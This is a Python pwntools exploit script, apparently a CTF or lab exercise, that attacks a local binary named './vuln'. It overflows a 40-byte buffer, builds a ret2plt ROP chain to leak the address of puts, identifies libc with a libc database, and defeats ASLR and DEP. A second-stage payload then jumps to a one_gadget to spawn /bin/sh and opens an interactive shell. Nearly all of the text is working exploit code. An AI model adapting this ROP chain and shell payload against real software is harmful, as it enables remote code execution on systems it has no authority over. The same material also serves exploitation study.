#ROP: ret2plt  ----> INFO LEAK
#libc de-anonymization, DEP and ASLR bypass
#one_gadget conclusion

from pwn import * # Import pwntools
from pylibcdb.LibcDB import LibcDB

def unpack48(x):
    x1, x2, x3 = struct.unpack('<HHI', x)
    return x1, x2 | (x3 << 16)

p = process("./vuln") # start the vuln binary
#useful to take the time to attach manually from gdb (docker)
sys.stdin.read(1) # reads one byte at a time, similar to getchar()

elf = ELF("./vuln")# Extract data from binary
rop = ROP(elf)# Find ROP gadgets

print("PLT:")
print(elf.plt)
print("\nGOT:")
print(elf.got)

PUTS_PLT = elf.plt['puts']
MAIN = elf.symbols['main']
PUTS_GOT = elf.got['puts']
LIBC_START_MAIN = elf.got['__libc_start_main']

POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]# Same as ROPgadget --binary vuln | grep "pop rdi"
RET = (rop.find_gadget(['ret']))[0]

poprbp = rop.find_gadget(["pop rbp", "ret"])

log.info("puts@plt: " + hex(PUTS_PLT))
log.info("puts@got: " + hex(PUTS_GOT))
log.info("__libc_start_main@got: " + hex(LIBC_START_MAIN))
log.info("pop rdi gadget: " + hex(POP_RDI))
log.info("poprbp gadget: " + hex(poprbp.address))


#Overflow buffer until return address
base = "A"*32 + "B"*8
# Create rop chain
rop = base.encode() + p64(POP_RDI) + p64(PUTS_GOT) +  p64(PUTS_PLT) + p64(MAIN)

#Send our rop-chain payload
print(p.recvuntil(b'\n\n'))
p.sendline(rop)

rec = p.recv(8) #TODO: recv(6)?
#Parse leaked address
leak = u64(rec[:-2].ljust(8, "\x00".encode()))  
print(leak)
log.info("Leaked libc address, puts: %s" % hex(leak))

libcdb = LibcDB("/home/exploitation/libc-database")
libc_name = libcdb.find_by_address(hex(leak), symbol="puts")
print("NAME OF DISCOVERED LIBC: " +libc_name)
libc_path = libcdb.download_by_name(libc_name)
print("PATH OF DISCOVERED LIBC: " + libc_path)

libc = ELF(libc_path)
libc.address = leak - libc.sym["puts"]
print("Libc base address ", hex(libc.address))


"""
#one_gadget /lib/x86_64-linux-gnu/libc.so.6
0x50a37 posix_spawn(rsp+0x1c, "/bin/sh", 0, rbp, rsp+0x60, environ)   <----------- IT WORKS
constraints:
  rsp & 0xf == 0
  rcx == NULL
  rbp == NULL || (u16)[rbp] == NULL

0xebcf1 execve("/bin/sh", r10, [rbp-0x70])
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

0xebcf5 execve("/bin/sh", r10, rdx)
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL
  [rdx] == NULL || rdx == NULL

0xebcf8 execve("/bin/sh", rsi, rdx)
constraints:
  address rbp-0x78 is writable
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL

"""

one_gadget = libc.address + 0x50a37  
print("Found one_gadget", hex(one_gadget))

#gdb.attach(p)

#STAGE 2
print(p.recvline())
payload = base.encode()
payload += p64(poprbp.address)  #one_gadget constraint
payload += p64(0x0)
payload += p64(one_gadget)

p.sendline(payload)
p.interactive()